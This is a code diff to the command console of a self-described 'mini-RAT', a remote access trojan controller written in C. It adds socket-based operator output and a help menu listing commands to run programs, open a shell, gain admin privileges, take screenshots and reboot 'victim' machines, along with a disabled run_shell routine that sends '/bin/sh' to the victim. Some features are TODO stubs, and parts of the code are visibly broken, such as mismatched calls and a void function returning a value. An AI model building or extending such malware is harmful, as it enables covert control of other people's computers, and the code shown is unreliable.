@@ -7,107 +7,148 @@
 int running = 1;
 int cur_session = 0;
 
-void print_session(void) {
+void print_session(int sock) {
         if (cur_session == 0) {
-                printf("No session selected\n");
+                dprintf(sock, "No session selected\n");
                 return;
         }
-        printf("Session %d\n", cur_session);
+        dprintf(sock, "Session %d\n", cur_session);
 }
 
-void print_status(void) {
+void print_status(int sock) {
         int num_ses = num_alive_sessions();
         if (num_ses != 0)
-                printf("Current session ID: %d\n", cur_session);
-        printf("Total active sessions: %d\n", num_ses);
+                dprintf(sock, "Current session ID: %d\n", cur_session);
+        dprintf(sock, "Total active sessions: %d\n", num_ses);
 }
 
-void print_hostinfo(void) {
+void print_help(int sock) {
+        dprintf(sock, "Command list:\n");
+        dprintf(sock, "\tstatus: print mini-RAT status\n");
+        dprintf(sock, "\thostinfo: print victim system information\n");
+        dprintf(sock, "\texec: run command on victim machine\n");
+        dprintf(sock, "\tshutdown: turn off a victim machine\n");
+        dprintf(sock, "\treboot: reboot a victim machine\n");
+        dprintf(sock, "\tshell: run a shell on victim machine\n");
+        dprintf(sock, "\tgetprivs: attempt to gain admin privileges\n");
+        dprintf(sock, "\tscreenshot: take a screenshot on victim machine\n");
+        dprintf(sock, "\thelp: print this help\n");
+}
+
+void print_hostinfo(int sock) {
         if (cur_session == 0)
                 return;
         write_session(cur_session, "HOSTINFO\r\n", 11);
         char *buffer = malloc(4096);
         if (read_session(cur_session, buffer, 4096) <= 0) {
-                printf("Timeout on session %d\n", cur_session);
+                dprintf(sock, "Timeout on session %d\n", cur_session);
                 kill_session(cur_session);
                 cur_session = 0;
                 return;
         }
 
-        printf(buffer);
+        dprintf(sock, buffer);
         free(buffer);
 }
 
-void swap_session(int session) {
+void run_shell(int sock) {
+        dprintf(sock, "Shell command not available!\n");
+        return 0;
+
+        if (cur_session == 0)
+                return;
+
+        write_session(cur_session, "EXEC /bin/sh\r\n", 12);
+        char *buffer = malloc(4096);
+        size_t bufsz = 4096;
+        memset(buffer, 0, 4096);
+        while (1) {
+                read_session(cur_session, buffer, 4096);
+                if (strncmp(buffer, "RETURN", 6) == 0)
+                        break;
+                dprintf(sock, buffer);
+                memset(buffer, 0, 4096);
+                getline(&buffer, &bufsz, stdin);
+                write_session(cur_session, buffer, 4096);
+        }
+}
+
+void swap_session(int sock, int session) {
         struct session *s = find_session(session);
         if (s == NULL) {
-                printf("No such session\n");
+                dprintf(sock, "No such session\n");
                 return;
         }
 
         cur_session = session;
         s->alive = 2;
-        printf("Swapped to session %d\n", session);
+        dprintf(sock, "Swapped to session %d\n", session);
 }
 
-void run_exec(const char **argv) {
+void run_exec(int sock, const char **argv) {
         if (cur_session == 0)
                 return;
 
         char *buffer = malloc(4096);
-        strcpy(buffer, "EXEC ");
-        size_t idx = 0;
-        const char *temp = argv[idx];
-        while (temp != NULL) {
-                strcat(buffer, temp);
+        strcpy(buffer, "EXEC");
+        int idx = 0;
+        while (argv[idx] != NULL) {
                 strcat(buffer, " ");
-                temp = argv[++idx];
+                strcat(buffer, argv[idx]);
+                idx++;
         }
-        buffer[strlen(buffer)-1] = '\0';
         strcat(buffer, "\r\n");
-        write_session(cur_session, buffer, 4096);
+        write_session(cur_session, buffer, strlen(buffer));
         memset(buffer, 0, 4096);
 
         read_session(cur_session, buffer, 4096);
-        printf(buffer);
+        char* lines = NULL;
+        str_split(lines, &buffer, "\r\n");
+        dprintf(sock, lines[0]);
         free(buffer);
 }
 
-void parse_cmd(char *line) {
-        const char **tokens = (const char**)str_split(line, " ");
-        if (tokens == NULL)
+void parse_cmd(int sock, char *line) {
+        char **argv = NULL;
+        size_t num_tokens = str_split(&argv, line, " ");
+        if (argv == NULL)
                 return;
 
-        if (strcmp(tokens[0], "exit") == 0) {
+        if (strcmp(argv[0], "exit") == 0) {
                 running = 0;
-        } else if (strcmp(tokens[0], "session") == 0) {
-                if (tokens[1] == NULL) {
-                        print_session();
+        } else if (strcmp(argv[0], "session") == 0) {
+                if (argv[1] == NULL) {
+                        print_session(sock);
                         return;
                 }
-                swap_session(atoi(tokens[1]));
-        } else if (strcmp(tokens[0], "pingpong") == 0) {
-                struct session *s = find_session(cur_session);
-                ping_pong(s->socket);
-        } else if (strcmp(tokens[0], "read") == 0) {
-                char buffer[1024];
-                read_session(cur_session, buffer, 1024);
-                printf("%s\n", buffer);
-        } else if (strcmp(tokens[0], "status") == 0) {
-                print_status();
-        } else if (strcmp(tokens[0], "hostinfo") == 0) {
-                print_hostinfo();
-        } else if (strcmp(tokens[0], "exec") == 0) {
-                run_exec(&tokens[1]);
-        } else if (strcmp(tokens[0], "stop") == 0) {
-                write_session(cur_session, "EXIT", 4);
+                swap_session(sock, atoi(argv[1]));
+        } else if (strcmp(argv[0], "status") == 0) {
+                print_status(sock);
+        } else if (strcmp(argv[0], "hostinfo") == 0) {
+                print_hostinfo(sock);
+        } else if (strcmp(argv[0], "exec") == 0) {
+                run_exec(sock, &argv[1]);
+        } else if (strcmp(argv[0], "stop") == 0) {
+                write_session(cur_session, "EXIT\r\n", 7);
                 kill_session(cur_session);
-        } else if (strlen(tokens[0]) == 0) {
+        } else if (strcmp(argv[0], "shutdown") == 0) {
+                //TODO: shutdown_client(1);
+        } else if (strcmp(argv[0], "reboot") == 0) {
+                //TODO: shutdown_client(0);
+        } else if (strcmp(argv[0], "shell") == 0) {
+                run_shell(sock);
+        } else if (strcmp(argv[0], "getprivs") == 0) {
+                //TODO: get_privs();
+        } else if (strcmp(argv[0], "screenshot") == 0) {
+                //TODO: screenshot();
+        } else if (strcmp(argv[0], "help") == 0) {
+                print_help(sock);
+        } else if (strlen(argv[0]) == 0) {
                 // Do nothing
         } else {
                 printf("Invalid command\n");
         }
-        free(tokens);
+        free(argv);
         return;
 }
 
